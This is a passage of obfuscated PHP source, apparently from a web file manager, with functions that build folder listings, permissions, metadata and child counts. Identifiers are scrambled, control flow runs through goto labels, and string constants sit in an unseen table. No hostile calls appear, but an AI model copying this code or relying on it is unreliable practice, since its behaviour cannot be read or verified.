$this->_listAppendChildren($Dó¿ç·óÔ­, $cÕŸ§Û‰Áª); } goto CœŞíğ‘¥ò; f®Œ‹¦âêå: $CÏİğóˆË¾ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$Dó¿ç·óÔ­) { $Dó¿ç·óÔ­ = array(); return; } $cÕŸ§Û‰Áª = array_to_keyvalue($Dó¿ç·óÔ­, $CÏİğóˆË¾[33], $CÏİğóˆË¾[369]); goto dŸÌÒí‚ñö; aŒ¹¶¥¬…£: $this->_listAppendUser($Dó¿ç·óÔ­); $this->_listFilterInfo($Dó¿ç·óÔ­, $aá»šï¼Ó§); goto c‹ÃÕ¹Ã‹; CœŞíğ‘¥ò: $this->_listAppendPath($Dó¿ç·óÔ­); $this->_listAppendAuth($Dó¿ç·óÔ­); $this->_listAppendSourceInfo($Dó¿ç·óÔ­, $cÕŸ§Û‰Áª); goto aŒ¹¶¥¬…£; c‹ÃÕ¹Ã‹: } protected function _listSourceCache($aÄ·¶Š¼íß) { $BµŒƒ¿„œ‰ =& $_SERVER[¬ˆÚÂ”Éğä]; foreach ($aÄ·¶Š¼íß as $C±óØÁ²) { self::$cacheSourceInfo[$BµŒƒ¿„œ‰[410] . $C±óØÁ²[$BµŒƒ¿„œ‰[369]]] = $C±óØÁ²; } } protected function _listFilterInfo(&$d©ÚÄÀ„ÜŸ, $A…ĞÌ¿¼¬ = false) { $CÙ‘—ñ¤“¦ =& $_SERVER[¬ˆÚÂ”Éğä]; foreach ($d©ÚÄÀ„ÜŸ as &$f¶ˆ‡²»•¿) { $f¶ˆ‡²»•¿ = $this->pathInfoFilter($f¶ˆ‡²»•¿); self::$cachePathInfo[$CÙ‘—ñ¤“¦[411] . intval($A…ĞÌ¿¼¬) . $CÙ‘—ñ¤“¦[412] . $f¶ˆ‡²»•¿[$CÙ‘—ñ¤“¦[369]]] = $f¶ˆ‡²»•¿; } unset($f¶ˆ‡²»•¿); } protected function _listMake(&$B¾õÏ„²´˜) { $BÛõ“¿íæ¢ =& $_SERVER[¬ˆÚÂ”Éğä]; $B¾õÏ„²´˜[$BÛõ“¿íæ¢[74]] = array(); $B¾õÏ„²´˜[$BÛõ“¿íæ¢[73]] = array(); foreach ($B¾õÏ„²´˜[$BÛõ“¿íæ¢[354]] as $bˆ…¨˜…Ø“) { $F¼ÛÔãçàÎ = $bˆ…¨˜…Ø“[$BÛõ“¿íæ¢[370]] == 1 ? $BÛõ“¿íæ¢[74] : $BÛõ“¿íæ¢[73]; $B¾õÏ„²´˜[$F¼ÛÔãçàÎ][] = $bˆ…¨˜…Ø“; } unset($B¾õÏ„²´˜[$BÛõ“¿íæ¢[354]]); } protected function _listAppendMeta(&$cóÃäİ¦¬, $FõÑˆÍŸº) { goto d²î§Ÿ®·; b¡óÍšâ£§: if (!$AÀˆôùò¤¯) { return; } $aÉ´‚ô‚ĞÆ = array($A¹¹¸Îî‰[415], $A¹¹¸Îî‰[416]); $BÄí·ğ·Œ = array(); goto D˜¢®îæä; d²î§Ÿ®·: $A¹¹¸Îî‰ =& $_SERVER[¬ˆÚÂ”Éğä]; $F›ª»º½Â¥ = array($A¹¹¸Îî‰[383] => array($A¹¹¸Îî‰[384], $FõÑˆÍŸº)); $AÀˆôùò¤¯ = Model($A¹¹¸Îî‰[413])->field($A¹¹¸Îî‰[414])->where($F›ª»º½Â¥)->select(); goto b¡óÍšâ£§; D˜¢®îæä: foreach ($AÀˆôùò¤¯ as $dÜ“Š‘ò×Á) { if (!isset($BÄí·ğ·Œ[$dÜ“Š‘ò×Á[$A¹¹¸Îî‰[369]]])) { $BÄí·ğ·Œ[$dÜ“Š‘ò×Á[$A¹¹¸Îî‰[369]]] = array(); } if (in_array($dÜ“Š‘ò×Á[$A¹¹¸Îî‰[89]], $aÉ´‚ô‚ĞÆ)) { continue; } $BÄí·ğ·Œ[$dÜ“Š‘ò×Á[$A¹¹¸Îî‰[369]]][$dÜ“Š‘ò×Á[$A¹¹¸Îî‰[89]]] = $dÜ“Š‘ò×Á[$A¹¹¸Îî‰[359]]; } foreach ($cóÃäİ¦¬ as &$BêƒƒÜÉŠª) { $BêƒƒÜÉŠª[$A¹¹¸Îî‰[417]] = !1; if (isset($BÄí·ğ·Œ[$BêƒƒÜÉŠª[$A¹¹¸Îî‰[369]]])) { $BêƒƒÜÉŠª[$A¹¹¸Îî‰[417]] = $BÄí·ğ·Œ[$BêƒƒÜÉŠª[$A¹¹¸Îî‰[369]]]; } if ($this->fileIsLock($BêƒƒÜÉŠª) && $BêƒƒÜÉŠª[$A¹¹¸Îî‰[376]]) { $FŒõí ­§ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $BêƒƒÜÉŠª[$A¹¹¸Îî‰[376]][$A¹¹¸Îî‰[377]] = AuthModel::authDisable($BêƒƒÜÉŠª[$A¹¹¸Îî‰[376]][$A¹¹¸Îî‰[377]], $FŒõí ­§); $BêƒƒÜÉŠª[$A¹¹¸Îî‰[376]][$A¹¹¸Îî‰[418]][$A¹¹¸Îî‰[376]] = $BêƒƒÜÉŠª[$A¹¹¸Îî‰[376]][$A¹¹¸Îî‰[377]]; } } unset($BêƒƒÜÉŠª); goto c‰ßñêö‰Ì; c‰ßñêö‰Ì: } protected function _listAppendFileMeta(&$c£ºâÛ†, $d¬»Èë”¾ê) { goto F»Éöö; C­¢„šœƒ¶: foreach ($c£ºâÛ† as &$fí¶ªèŒÒí) { goto B»—ÇÍêÜƒ; Aõ®’¼èŞÆ: $Dñí“ÀŞŠ÷[$FÍ™ñ¶²œÍ[77]] = $fí¶ªèŒÒí[$FÍ™ñ¶²œÍ[77]]; $Dñí“ÀŞŠ÷[$FÍ™ñ¶²œÍ[28]] = $fí¶ªèŒÒí[$FÍ™ñ¶²œÍ[28]]; self::$cacheFileInfo[$FÍ™ñ¶²œÍ[425] . $DÊ¼õ•¾ãñ] = array_merge(array(), $Dñí“ÀŞŠ÷); goto F¶ĞùµÂÅœ; B»—ÇÍêÜƒ: $DÊ¼õ•¾ãñ = $fí¶ªèŒÒí[$FÍ™ñ¶²œÍ[419]]; if (!$DÊ¼õ•¾ãñ || !isset($BØÓï¯«çÂ[$DÊ¼õ•¾ãñ])) { continue; } $Dñí“ÀŞŠ÷ = $BØÓï¯«çÂ[$DÊ¼õ•¾ãñ]; goto Aõ®’¼èŞÆ; F¶ĞùµÂÅœ: unset($BØÓï¯«çÂ[$DÊ¼õ•¾ãñ][$FÍ™ñ¶²œÍ[75]]); $aäÀêìª“ = is_array($E‚éÒÒßÄ½[$DÊ¼õ•¾ãñ]) ? $E‚éÒÒßÄ½[$DÊ¼õ•¾ãñ] : array(); $fí¶ªèŒÒí[$FÍ™ñ¶²œÍ[162]] = array_merge($aäÀêìª“, $BØÓï¯«çÂ[$DÊ¼õ•¾ãñ]); goto EŠİŸÙÊ‡ˆ; EŠİŸÙÊ‡ˆ: if (isset($fí¶ªèŒÒí[$FÍ™ñ¶²œÍ[162]][$FÍ™ñ¶²œÍ[426]])) { $fí¶ªèŒÒí[$FÍ™ñ¶²œÍ[426]] = json_decode($fí¶ªèŒÒí[$FÍ™ñ¶²œÍ[162]][$FÍ™ñ¶²œÍ[426]], !0); unset($fí¶ªèŒÒí[$FÍ™ñ¶²œÍ[162]][$FÍ™ñ¶²œÍ[426]]); } goto AÖÜåÊ¶; AÖÜåÊ¶: } unset($fí¶ªèŒÒí); goto dç©¢š©Õ; aŠãƒ”¸÷â: $eµ–ö¦Úç¸ = $eµ–ö¦Úç¸ ? $eµ–ö¦Úç¸ : array(); $E‚éÒÒßÄ½ = array(); foreach ($eµ–ö¦Úç¸ as $eÍ¡ˆÕ¾Ñ‹) { if (!isset($E‚éÒÒßÄ½[$eÍ¡ˆÕ¾Ñ‹[$FÍ™ñ¶²œÍ[419]]])) { $E‚éÒÒßÄ½[$eÍ¡ˆÕ¾Ñ‹[$FÍ™ñ¶²œÍ[419]]] = array(); } $E‚éÒÒßÄ½[$eÍ¡ˆÕ¾Ñ‹[$FÍ™ñ¶²œÍ[419]]][$eÍ¡ˆÕ¾Ñ‹[$FÍ™ñ¶²œÍ[89]]] = $eÍ¡ˆÕ¾Ñ‹[$FÍ™ñ¶²œÍ[359]]; } goto C­¢„šœƒ¶; Fª¸Ø·ö: $BØÓï¯«çÂ = Model($FÍ™ñ¶²œÍ[422])->field($Dœ£‹ÆŒí)->where($BØ´¬Ø°„)->select(); $BØÓï¯«çÂ = array_to_keyvalue($BØÓï¯«çÂ, $FÍ™ñ¶²œÍ[419]); $eµ–ö¦Úç¸ = Model($FÍ™ñ¶²œÍ[423])->field($FÍ™ñ¶²œÍ[424])->where($BØ´¬Ø°„)->select(); goto aŠãƒ”¸÷â; bÎôá×ïäÎ: if (!$c™‰÷öƒ‚”) { return; } $BØ´¬Ø°„ = array($FÍ™ñ¶²œÍ[420] => array($FÍ™ñ¶²œÍ[384], $c™‰÷öƒ‚”)); $Dœ£‹ÆŒí = $FÍ™ñ¶²œÍ[421]; goto Fª¸Ø·ö; F»Éöö: $FÍ™ñ¶²œÍ =& $_SERVER[¬ˆÚÂ”Éğä]; $c™‰÷öƒ‚” = array_to_keyvalue($c£ºâÛ†, $FÍ™ñ¶²œÍ[33], $FÍ™ñ¶²œÍ[419]); $c™‰÷öƒ‚” = array_filter(array_unique($c™‰÷öƒ‚”)); goto bÎôá×ïäÎ; dç©¢š©Õ: } protected function _listAppendSourceInfo(&$a„…èåªî’, $cßˆè¾Ÿ) { goto Cù³—ùÍç; Bó§ÉÔÂ†: return $a„…èåªî’; goto e¤˜ÊôÆ®; Cù³—ùÍç: $f¿â‘¾¥»ë =& $_SERVER[¬ˆÚÂ”Éğä]; if (!defined($f¿â‘¾¥»ë[427])) { return; } $aª„êœØ‰ = Model($f¿â‘¾¥»ë[428])->listData(); goto c¨­÷À¡ˆö; c¨­÷À¡ˆö: $d£ÍâÀ›„‰ = Model($f¿â‘¾¥»ë[392])->listData(); $b¸ß‚‘šñ = Model($f¿â‘¾¥»ë[381])->listData(); $A—ĞªÁÀƒø = Model($f¿â‘¾¥»ë[429])->listSimple(); goto aîÅÜ‹˜¡; aîÅÜ‹˜¡: $eõîÂ÷…Û = array_to_keyvalue($aª„êœØ‰, $f¿â‘¾¥»ë[367]); $cÖõ­Ó½®º = array_to_keyvalue_group($d£ÍâÀ›„‰, $f¿â‘¾¥»ë[75], $f¿â‘¾¥»ë[393]); $cÀíÎ‹Âá = array_to_keyvalue($b¸ß‚‘šñ, $f¿â‘¾¥»ë[75]); goto C¬³óë›­; C¬³óë›­: $AËòº‡Èæ = array_to_keyvalue_group($A—ĞªÁÀƒø, $f¿â‘¾¥»ë[369]); foreach ($a„…èåªî’ as &$DªÍ‰×Ó») { $DªÍ‰×Ó»[$f¿â‘¾¥»ë[391]] = array($f¿â‘¾¥»ë[430] => 0, $f¿â‘¾¥»ë[431] => 0, $f¿â‘¾¥»ë[432] => 0); if (isset($cÀíÎ‹Âá[$DªÍ‰×Ó»[$f¿â‘¾¥»ë[369]]])) { $DªÍ‰×Ó»[$f¿â‘¾¥»ë[391]][$f¿â‘¾¥»ë[433]] = 1; $DªÍ‰×Ó»[$f¿â‘¾¥»ë[391]][$f¿â‘¾¥»ë[434]] = $cÀíÎ‹Âá[$DªÍ‰×Ó»[$f¿â‘¾¥»ë[369]]][$f¿â‘¾¥»ë[28]]; } if (isset($cÖõ­Ó½®º[$DªÍ‰×Ó»[$f¿â‘¾¥»ë[369]]])) { $DªÍ‰×Ó»[$f¿â‘¾¥»ë[391]][$f¿â‘¾¥»ë[435]] = array(); foreach ($cÖõ­Ó½®º[$DªÍ‰×Ó»[$f¿â‘¾¥»ë[369]]] as $eÓğ®Ôª’Ì) { $aáîã®âƒç = $eõîÂ÷…Û[$eÓğ®Ôª’Ì]; $DªÍ‰×Ó»[$f¿â‘¾¥»ë[391]][$f¿â‘¾¥»ë[435]][] = array($f¿â‘¾¥»ë[436] => $aáîã®âƒç[$f¿â‘¾¥»ë[367]], $f¿â‘¾¥»ë[386] => $aáîã®âƒç[$f¿â‘¾¥»ë[28]], $f¿â‘¾¥»ë[437] => $aáîã®âƒç[$f¿â‘¾¥»ë[438]]); } } if (isset($AËòº‡Èæ[$DªÍ‰×Ó»[$f¿â‘¾¥»ë[369]]])) { $DªÍ‰×Ó»[$f¿â‘¾¥»ë[391]][$f¿â‘¾¥»ë[439]] = array(); foreach ($AËòº‡Èæ[$DªÍ‰×Ó»[$f¿â‘¾¥»ë[369]]] as $c©Æ±…¸é’) { $DªÍ‰×Ó»[$f¿â‘¾¥»ë[391]][$f¿â‘¾¥»ë[439]] = array($f¿â‘¾¥»ë[440] => $c©Æ±…¸é’[$f¿â‘¾¥»ë[441]], $f¿â‘¾¥»ë[442] => $c©Æ±…¸é’[$f¿â‘¾¥»ë[443]], $f¿â‘¾¥»ë[444] => $c©Æ±…¸é’[$f¿â‘¾¥»ë[369]], $f¿â‘¾¥»ë[445] => $c©Æ±…¸é’[$f¿â‘¾¥»ë[446]], $f¿â‘¾¥»ë[447] => $c©Æ±…¸é’[$f¿â‘¾¥»ë[448]], $f¿â‘¾¥»ë[449] => $c©Æ±…¸é’[$f¿â‘¾¥»ë[449]], $f¿â‘¾¥»ë[450] => $c©Æ±…¸é’[$f¿â‘¾¥»ë[450]]); } } } unset($DªÍ‰×Ó»); goto Bó§ÉÔÂ†; e¤˜ÊôÆ®: } protected function _listAppendChildren(&$e¥ñïØ«¼, $f†ˆÏ“Ã„) { goto Cğ½Øº·Ñœ; aÖëÓ‚îÓ‚: $f´Ğãï–¼Š = 1024 * 50; $e¥ñïØ«¼ = is_array($e¥ñïØ«¼) ? $e¥ñïØ«¼ : array(); $dĞÌÍ²¼Ğå = count($e¥ñïØ«¼); goto aÛÁ¢®Ÿˆ; eÜù¡÷‡‡Ö: foreach ($e¥ñïØ«¼ as &$c´´¡¬¡”) { if ($c´´¡¬¡”[$e¯›Ş‰²†¾[370]]) { unset($c´´¡¬¡”[$e¯›Ş‰²†¾[372]]); $c´´¡¬¡”[$e¯›Ş‰²†¾[192]] = intval($e˜ßÈ‘›¡î[$c´´¡¬¡”[$e¯›Ş‰²†¾[369]] . $e¯›Ş‰²†¾[453]][$e¯›Ş‰²†¾[454]]); $c´´¡¬¡”[$e¯›Ş‰²†¾[191]] = intval($e˜ßÈ‘›¡î[$c´´¡¬¡”[$e¯›Ş‰²†¾[369]] . $e¯›Ş‰²†¾[455]][$e¯›Ş‰²†¾[454]]); } } unset($c´´¡¬¡”); goto cŒÆ•Ïœ–; Cğ½Øº·Ñœ: $e¯›Ş‰²†¾ =& $_SERVER[¬ˆÚÂ”Éğä]; $a‚â‚ä»ïÈ = $e¯›Ş‰²†¾[361]; $e˜ßÈ‘›¡î = array(); goto aÖëÓ‚îÓ‚; aÛÁ¢®Ÿˆ: $CÊÆ…Ş•Ê = $this->tablePrefix . $this->tableName; for ($dÑ‰ŞÃ¯Î¥ = 0; $dÑ‰ŞÃ¯Î¥ < $dĞÌÍ²¼Ğå; $dÑ‰ŞÃ¯Î¥++) { $dœ¿İåËñ‰ = intval($e¥ñïØ«¼[$dÑ‰ŞÃ¯Î¥][$e¯›Ş‰²†¾[397]]); if ($e¥ñïØ«¼[$dÑ‰ŞÃ¯Î¥][$e¯›Ş‰²†¾[370]]) { $f¹Ù­ÖâœÏ = $e¥ñïØ«¼[$dÑ‰ŞÃ¯Î¥][$e¯›Ş‰²†¾[369]]; $a‚â‚ä»ïÈ .= "\x53\105\x4c\x45\103\124\40\52\40\106\x52\x4f\115\x20\x28\123\105\114\x45\x43\x54\40\x27{$f¹Ù­ÖâœÏ}\x5f\150\141\163\x46\x69\x6c\x65\x27\40\x61\163\x20\150\x61\x73\x2c\x63\x6f\x75\x6e\x74\50\x31\x29\x20\x61\163\40\x68\141\163\103\157\165\x6e\x74\x20\106\122\117\115\40\x60{$CÊÆ…Ş•Ê}\140\x20\xa\x9\11\11\11\x9\x77\150\x65\162\x65\40\160\141\x72\x65\156\x74\x49\x44\x3d{$f¹Ù­ÖâœÏ}\40\141\x6e\144\x20\x69\163\106\x6f\x6c\x64\145\162\75\x30\40\141\x6e\x64\40\151\163\x44\x65\154\x65\x74\x65\75{$dœ¿İåËñ‰}\x29\x20\x61\163\40\x74\142\x31\137{$f¹Ù­ÖâœÏ}\x20\x75\156\x69\x6f\x6e\40\x61\154\x6c\x20\xa\x9\11\x9\x9\x9\123\x45\x4c\x45\x43\124\40\52\x20\106\x52\x4f\115\40\50\123\105\x4c\x45\103\124\x20\47{$f¹Ù­ÖâœÏ}\x5f\x68\x61\x73\106\x6f\x6c\x64\x65\162\47\40\141\x73\x20\x68\x61\163\106\x69\x6c\x65\x2c\143\157\x75\x6e\x74\50\61\51\40\141\163\x20\150\x61\x73\103\x6f\x75\156\164\x20\106\122\117\115\x20\x60{$CÊÆ…Ş•Ê}\140\40\xa\11\11\11\x9\11\x77\x68\145\x72\x65\x20\x70\141\162\145\x6e\x74\x49\104\75{$f¹Ù­ÖâœÏ}\x20\141\x6e\x64\40\x69\x73\106\157\x6c\144\145\162\x3d\x31\40\x61\156\x64\x20\x69\x73\104\x65\154\x65\164\x65\x3d{$dœ¿İåËñ‰}\51\40\141\163\x20\x74\x62\x32\x5f{$f¹Ù­ÖâœÏ}\x20\x75\156\151\x6f\156\40\141\x6c\154\x20"; } if ((strlen($a‚â‚ä»ïÈ) >= $f´Ğãï–¼Š || $dÑ‰ŞÃ¯Î¥ == $dĞÌÍ²¼Ğå - 1) && $a‚â‚ä»ïÈ) { $a‚â‚ä»ïÈ = substr($a‚â‚ä»ïÈ, 0, -strlen($e¯›Ş‰²†¾[451])); $eÎÂˆ¡ ê = $this->query($a‚â‚ä»ïÈ); $e˜ßÈ‘›¡î = array_merge($e˜ßÈ‘›¡î, $eÎÂˆ¡ ê); $a‚â‚ä»ïÈ = $e¯›Ş‰²†¾[33]; } } $e˜ßÈ‘›¡î = array_to_keyvalue($e˜ßÈ‘›¡î, $e¯›Ş‰²†¾[452]); goto eÜù¡÷‡‡Ö; cŒÆ•Ïœ–: } protected function _listAppendAuth(&$c‹’ÖÉõ¨È) { goto d÷ößêßî‘; d÷ößêßî‘: $a¶«ÔãéŞ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!defined($a¶«ÔãéŞ[427])) { return; } $eŞò±‰§µ° = array(); goto FÖ˜—£àâ°; FÖ˜—£àâ°: foreach ($c‹’ÖÉõ¨È as $Fƒ‡‘•šù¾) { if ($Fƒ‡‘•šù¾[$a¶«ÔãéŞ[371]] == self::TYPE_GROUP) { $eŞò±‰§µ°[] = $Fƒ‡‘•šù¾[$a¶«ÔãéŞ[369]]; } } if (!$eŞò±‰§µ°) { return; } $A™¸ÌÓÀĞØ = array_to_keyvalue($c‹’ÖÉõ¨È, $a¶«ÔãéŞ[369]); goto c‹Ñ“Ÿ¯Ÿ¶; c‹Ñ“Ÿ¯Ÿ¶: $aÇ‚ãŠ“µË = Model($a¶«ÔãéŞ[456])->getSourceList($eŞò±‰§µ°, $A™¸ÌÓÀĞØ); foreach ($c‹’ÖÉõ¨È as $aÍÔÁ‚ÄÊÑ => &$Fƒ‡‘•šù¾) { $Fƒ‡‘•šù¾[$a¶«ÔãéŞ[376]] = $aÇ‚ãŠ“µË[$Fƒ‡‘•šù¾[$a¶«ÔãéŞ[369]]]; if (!$Fƒ‡‘•šù¾[$a¶«ÔãéŞ[376]] && $Fƒ‡‘•šù¾[$a¶«ÔãéŞ[371]] == self::TYPE_GROUP) { $Fƒ‡‘•šù¾[$a¶«ÔãéŞ[376]] = Action($a¶«ÔãéŞ[457])->pathGroupAuthMake($Fƒ‡‘•šù¾[$a¶«ÔãéŞ[458]]); if (!$Fƒ‡‘•šù¾[$a¶«ÔãéŞ[376]] && !_get($GLOBALS, $a¶«ÔãéŞ[459])) { $Fƒ‡‘•šù¾[$a¶«ÔãéŞ[189]] = !1; $Fƒ‡‘•šù¾[$a¶«ÔãéŞ[188]] = !1; } } if ($Fƒ‡‘•šù¾[$a¶«ÔãéŞ[376]]) { $Fƒ‡‘•šù¾[$a¶«ÔãéŞ[189]] = AuthModel::authCheckEdit($Fƒ‡‘•šù¾[$a¶«ÔãéŞ[376]][$a¶«ÔãéŞ[377]]); $Fƒ‡‘•šù¾[$a¶«ÔãéŞ[188]] = AuthModel::authCheckView($Fƒ‡‘•šù¾[$a¶«ÔãéŞ[376]][$a¶«ÔãéŞ[377]]); } $this->groupPathDisplay($Fƒ‡‘•šù¾); } unset($Fƒ‡‘•šù¾); goto c‹× Ëİ‰â; c‹× Ëİ‰â: } public function groupPathDisplay(&$B‡«Ì•ö—¤) { goto Fº›á›Õ; F‰©À˜ù÷–: $B‡«Ì•ö—¤[$AÜáÒîœ­[466]] = $f‚Ì«šŠæŠ . $fãê‡„ôç®[$AÜáÒîœ­[391]][$AÜáÒîœ­[369]]; goto D²óÀœœ; f“å¤†…•Õ: $Dˆœ‡»‡˜† = $this->parentLevelArray($fãê‡„ôç®[$AÜáÒîœ­[461]]); $f‚Ì«šŠæŠ = $AÜáÒîœ­[33]; foreach ($Dˆœ‡»‡˜† as $A‘À¾äê÷à) { $AøœÆ‘¦ğ¬ = Model($AÜáÒîœ­[460])->getInfo($A‘À¾äê÷à); $f‚Ì«šŠæŠ .= $AøœÆ‘¦ğ¬[$AÜáÒîœ­[391]][$AÜáÒîœ­[369]] . $AÜáÒîœ­[47]; } goto Dñ‰“Ñ÷ôÎ; Dñ‰“Ñ÷ôÎ: $B‡«Ì•ö—¤[$AÜáÒîœ­[462]] = $fãê‡„ôç®[$AÜáÒîœ­[463]]; $B‡«Ì•ö—¤[$AÜáÒîœ­[380]] = $fãê‡„ôç®[$AÜáÒîœ­[461]]; $B‡«Ì•ö—¤[$AÜáÒîœ­[464]] = $fãê‡„ôç®[$AÜáÒîœ­[465]]; goto F‰©À˜ù÷–; Fº›á›Õ: $AÜáÒîœ­ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($B‡«Ì•ö—¤[$AÜáÒîœ­[371]] != self::TYPE_GROUP) { return; } $fãê‡„ôç® = Model($AÜáÒîœ­[460])->getInfo($B‡«Ì•ö—¤[$AÜáÒîœ­[458]]); goto f“å¤†…•Õ; D²óÀœœ: } protected function _listAppendPath(&$aÒˆ—¾ÅåÓ) { goto c†â¹æàÆ; Bç‰ì¾†§”: $cÜÛÊËÂò£ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($aÒˆ—¾ÅåÓ as &$Dö‰Î‡ìÈ§) { goto dÄ‰¸§¢«; FÆ²àÖªùƒ: if ($fåÒãÆØÎ) { $dŒï÷ñšŠ‚ .= $Dö‰Î‡ìÈ§[$E‚ĞçÚë©[28]]; } if ($Dö‰Î‡ìÈ§[$E‚ĞçÚë©[370]]) { $dŒï÷ñšŠ‚ .= $E‚ĞçÚë©[8]; } $Dö‰Î‡ìÈ§[$E‚ĞçÚë©[468]] = str_replace($E‚ĞçÚë©[469], $E‚ĞçÚë©[8], $dŒï÷ñšŠ‚); goto bç¸ºöÑ¹Í; bç¸ºöÑ¹Í: $F•®’Ë¯ = trim($Dö‰Î‡ìÈ§[$E‚ĞçÚë©[468]], $E‚ĞçÚë©[8]); if ($Dö‰Î‡ìÈ§[$E‚ĞçÚë©[463]] == $E‚ĞçÚë©[470] && $F•®’Ë¯) { $Dö‰Î‡ìÈ§[$E‚ĞçÚë©[28]] = $F•®’Ë¯; } $this->_listAppendPathRecycle($Dö‰Î‡ìÈ§, $fåÒãÆØÎ, $cÜÛÊËÂò£); goto aÏ†¯ÍéÈ; dÄ‰¸§¢«: $fåÒãÆØÎ = $this->parentLevelArray($Dö‰Î‡ìÈ§[$E‚ĞçÚë©[461]]); $dŒï÷ñšŠ‚ = $this->_listAppendPathRoot($Dö‰Î‡ìÈ§, $fåÒãÆØÎ); foreach ($fåÒãÆØÎ as $CŒ†‰Ÿ¥ï => $D¥ÒÌ‰¿à) { if ($CŒ†‰Ÿ¥ï == 0 && $dŒï÷ñšŠ‚ && $Dö‰Î‡ìÈ§[$E‚ĞçÚë©[371]] == self::TYPE_GROUP) { continue; } if (isset($Dã‹Àóí¢æ[$D¥ÒÌ‰¿à])) { $dŒï÷ñšŠ‚ .= $Dã‹Àóí¢æ[$D¥ÒÌ‰¿à] . $E‚ĞçÚë©[8]; } } goto FÆ²àÖªùƒ; aÏ†¯ÍéÈ: } unset($Dö‰Î‡ìÈ§); goto a–Õº Š±ˆ; a–Õº Š±ˆ: return $aÒˆ—¾ÅåÓ; goto a’øºĞ„å; c†â¹æàÆ: $E‚ĞçÚë© =& $_SERVER[¬ˆÚÂ”Éğä]; static $Dã‹Àóí¢æ = array(); $Cèã¯¥Ã¡Ï = array(); goto D™éá×Ş‘; D™éá×Ş‘: foreach ($aÒˆ—¾ÅåÓ as &$Dö‰Î‡ìÈ§) { $Dã‹Àóí¢æ[$Dö‰Î‡ìÈ§[$E‚ĞçÚë©[369]]] = $Dö‰Î‡ìÈ§[$E‚ĞçÚë©[28]]; $fåÒãÆØÎ = $this->parentLevelArray($Dö‰Î‡ìÈ§[$E‚ĞçÚë©[461]]); foreach ($fåÒãÆØÎ as $CŒ†‰Ÿ¥ï => $D¥ÒÌ‰¿à) { if ($CŒ†‰Ÿ¥ï != 0 && !isset($Dã‹Àóí¢æ[$D¥ÒÌ‰¿à])) { $Cèã¯¥Ã¡Ï[] = $D¥ÒÌ‰¿à; } } } unset($Dö‰Î‡ìÈ§); if (count($Cèã¯¥Ã¡Ï) > 0) { $B î˜´İ¿Ø = array($E‚ĞçÚë©[383] => array($E‚ĞçÚë©[384], $Cèã¯¥Ã¡Ï)); if (count($Cèã¯¥Ã¡Ï) == 1) { $f´ÈˆÍ‹¢é = $this->sourceInfo($Cèã¯¥Ã¡Ï[0]); $F‹õÕÓÕÌì = is_array($f´ÈˆÍ‹¢é) ? array($f´ÈˆÍ‹¢é) : !1; } else { $F‹õÕÓÕÌì = $this->field($E‚ĞçÚë©[467])->where($B î˜´İ¿Ø)->select(); } $FŒ˜ Ù±Û« = array_to_keyvalue($F‹õÕÓÕÌì, $E‚ĞçÚë©[369], $E‚ĞçÚë©[28]); $Dã‹Àóí¢æ = array_merge_index($Dã‹Àóí¢æ, $FŒ˜ Ù±Û«); } goto Bç‰ì¾†§”; a’øºĞ„å: } private function _listAppendPathRecycle(&$a¸¿¯ÒùŒ·, $féáÏ”Şİ‹, $fÒéã”ôÁõ) { goto dùïœº»“«; E›±÷µÉÎÅ: $B‘õ–íßĞö = explode($a¶ƒ¤ÎªëÑ[8], trim($a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[468]], $a¶ƒ¤ÎªëÑ[8])); $b†ö”“‡É© = implode($a¶ƒ¤ÎªëÑ[8], array_slice($B‘õ–íßĞö, 2)); $a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[468]] = $a¶ƒ¤ÎªëÑ[8] . LNG($a¶ƒ¤ÎªëÑ[471]) . $a¶ƒ¤ÎªëÑ[8] . ltrim($b†ö”“‡É©, $a¶ƒ¤ÎªëÑ[8]); goto c‹·”õ¡Ù; dùïœº»“«: $a¶ƒ¤ÎªëÑ =& $_SERVER[¬ˆÚÂ”Éğä]; if (intval($a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($fÒéã”ôÁõ, $féáÏ”Şİ‹) && $a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[369]] != $fÒéã”ôÁõ) { return; } goto E›±÷µÉÎÅ; c‹·”õ¡Ù: $a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[461]] = $a¶ƒ¤ÎªëÑ[472] . implode($a¶ƒ¤ÎªëÑ[47], array_slice($féáÏ”Şİ‹, 1)) . $a¶ƒ¤ÎªëÑ[47]; if ($a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[369]] == $fÒéã”ôÁõ) { $a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[461]] = $a¶ƒ¤ÎªëÑ[472]; $a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[463]] = $a¶ƒ¤ÎªëÑ[470]; $a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[28]] = LNG($a¶ƒ¤ÎªëÑ[471]); } $a¸¿¯ÒùŒ·[$a¶ƒ¤ÎªëÑ[473]] = $a¶ƒ¤ÎªëÑ[474]; goto a¤Š–´à; a¤Š–´à: } protected function _listAppendPathRoot(&$eá¦²¦‡¡¢, $D ‡…®„—é) { $dçæÉ„êó =& $_SERVER[¬ˆÚÂ”Éğä]; $f¡óÜÛÜÀ = $dçæÉ„êó[33]; if ($eá¦²¦‡¡¢[$dçæÉ„êó[371]] == self::TYPE_USER) { if (defined($dçæÉ„êó[427]) && $eá¦²¦‡¡¢[$dçæÉ„êó[458]] == USER_ID) { $f¡óÜÛÜÀ = LNG($dçæÉ„êó[475]); if (!$D ‡…®„—é) { $eá¦²¦‡¡¢[$dçæÉ„êó[28]] = $f¡óÜÛÜÀ; } } else { $eÀ¡óË´Œ‡ = Model($dçæÉ„êó[476])->getInfoSimple($eá¦²¦‡¡¢[$dçæÉ„êó[458]]); $f¡óÜÛÜÀ = LNG($dçæÉ„êó[477]) . $dçæÉ„êó[157] . $eÀ¡óË´Œ‡[$dçæÉ„êó[28]] . $dçæÉ„êó[478]; } } else { if ($eá¦²¦‡¡¢[$dçæÉ„êó[371]] == self::TYPE_GROUP) { $eÀ¡óË´Œ‡ = Model($dçæÉ„êó[460])->getInfoSimple($eá¦²¦‡¡¢[$dçæÉ„êó[458]]); 